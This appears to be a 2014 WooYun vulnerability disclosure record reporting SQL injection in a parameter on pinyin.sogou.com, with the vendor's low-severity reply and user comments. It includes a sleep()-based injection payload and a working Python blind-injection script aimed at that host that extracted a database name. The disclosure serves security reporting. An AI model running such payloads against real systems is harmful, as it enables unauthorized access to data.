{"id": 49283, "wybug_id": "wooyun-2014-079383", "wybug_title": "搜狗SQL注入2: pinyin.sogou.com上的MySQL注射", "wybug_corp": "搜狗", "wybug_author": "lijiejie", "wybug_date": "2014-10-14 23:27", "wybug_open_date": "2014-11-28 23:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-28：\t细节向公众公开  简要描述： 第二枚，pinyin.sogu.com上的MySQL注射 详细说明：  注入点位于：_____________________________________________________________POST http://pinyin.sogou.com/dict/ywz/ajax/make_dict.phpcustom_id_list=if(0,sleep(1),0)&ywz_id_list=427_____________________________________________________________参数custom_id_list未过滤，可注入。几行python脚本，猜解user()：\nimport httplibimport timeimport stringimport sysimport randomimport urllibheaders = {    'Content-Type':'application/x-www-form-urlencoded',    'Cookie': '',    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',}payloads = list(string.ascii_lowercase)payloads += list(string.ascii_uppercase)for i in range(0,10):    payloads.append(str(i))payloads += ['@','_', '.']print 'Current user() is:'user = ''for i in range(1,24,1):    for payload in payloads:        try:            conn = httplib.HTTPConnection('pinyin.sogou.com', timeout=10)            rand_num = str(random.random())            url = '/dict/ywz/ajax/make_dict.php'            start_time = time.time()            conn.request(method='POST',                         url=url,                         body='custom_id_list=if(ascii(mid(database(),%s,1))=%s,sleep(1),0)&ywz_id_list=427' % (i, ord(payload)),                         headers = headers)            html_doc = conn.getresponse().read()            conn.close()            if time.time() - start_time > 5:                raise Exception('timeout')        except:            user += payload            sys.stdout.write( user + '\\r' )            sys.stdout.flush()            break\n   漏洞证明：  user()为:  dict_4_1_3\n\n   修复方案：  参数过滤和必要的转义   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2014-10-18 22:08 厂商回复： 低分原因：该漏洞之前已在SGSRC平台提交，我们正在修复。感谢支持，欢迎到SGSRC平台提交漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-15 00:14 |    \t\t兔兔侠 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        )\t\t \n  前排上ccav    \n     2014-10-15 08:59 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  目测会忽略  SSRC上已提交过...    \n     2014-10-19 00:50 |    \t\t写个七 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 一点一点积累。)\t\t \n  SGSRC平台    \n     2015-02-27 13:45 |    \t\t小飞侠 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 好好学习，天天向上)\t\t \n  great    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}